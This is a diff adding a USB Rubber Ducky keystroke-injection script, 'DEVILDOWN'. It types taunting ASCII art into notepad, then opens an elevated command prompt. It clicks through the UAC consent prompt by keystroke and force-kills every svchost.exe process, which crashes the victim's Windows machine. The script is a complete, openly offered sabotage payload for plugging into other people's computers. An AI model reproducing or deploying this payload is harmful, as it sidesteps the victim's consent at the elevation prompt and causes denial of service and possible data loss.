@@ -1,0 +1,103 @@
+REM DEVILDOWN
+REM Made By Blas1ed
+GUI r
+DELAY 300
+STRING notepad
+ENTER
+DELAY 500
+STRING                             ,-.
+ENTER
+HOME
+STRING        ___,---.__          /'|`\          __,---,___
+ENTER
+HOME
+STRING     ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
+ENTER
+HOME
+STRING   ,'        |    Gummy/ ~'\     /`~ Gummy/    |        `.
+ENTER
+HOME
+STRING  /      ___//  Blas1ed     `. ,'  Blas1ed  ,  , \___      \
+ENTER
+HOME
+STRING |    ,-'   `-.__   _         |        ,    __,-'   `-.    |
+ENTER
+HOME
+STRING |   / made     /\_  `   .    |    ,      _/\     made   \   |
+ENTER
+HOME
+STRING \  |  by         \ \`-.___ \   |   / ___,-'/ /     by    |  /
+ENTER
+HOME
+STRING  \  \   Blas1ed  | `._   `\\  |  //'   _,' |   Blas1ed  /  /
+ENTER
+HOME
+STRING   `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
+ENTER
+HOME
+STRING      ``       /     \    ,='/ \`=.    /     \       ''
+ENTER
+HOME
+STRING              |__   /|\_,--.,-.--,--._/|\   __|
+ENTER
+HOME
+STRING              /  `./  \\`\ |  |  | /,//' \,'  \
+ENTER
+HOME
+STRING             /   /     ||--+--|--+-/-|     \   \
+ENTER
+HOME
+STRING            |   |     /'\_\_\ | /_/_/`\     |   |
+ENTER
+HOME
+STRING             \   \__, \_     `~'     _/ .__/   /
+ENTER
+HOME
+STRING              `-._,-'   `-._______,-'   `-._,-'
+ENTER
+HOME
+DELAY 2000
+STRING            )     ) (                )      
+ENTER
+HOME
+STRING   (      ( /(  ( /( )\ )      (   ( /(      
+ENTER
+HOME
+STRING  )\ )   )\()) )\()|()/(    ( )\  )\())(    
+ENTER
+HOME
+STRING (()/(  ((_)\ ((_)\ /(_))   )((_)((_)\ )\   
+ENTER
+HOME
+STRING  /(_))_  ((_)  ((_|_))_   ((_)___ ((_|(_)  
+ENTER
+HOME
+STRING (_)) __|/ _ \ / _ \|   \   | _ ) \ / / __| 
+ENTER
+HOME
+STRING   | (_ | (_) | (_) | |) |  | _ \\ V /| _|  
+ENTER
+HOME
+STRING    \___|\___/ \___/|___/   |___/ |_| |___| 
+DELAY 1000
+GUI r
+DELAY 300
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 850
+SHIFT TAB
+DELAY 300
+ENTER
+DELAY 700
+STRING TASKKILL /IM svchost.exe /F
+DELAY 300
+ENTER
+
+
+
+
+
+
+
+
+
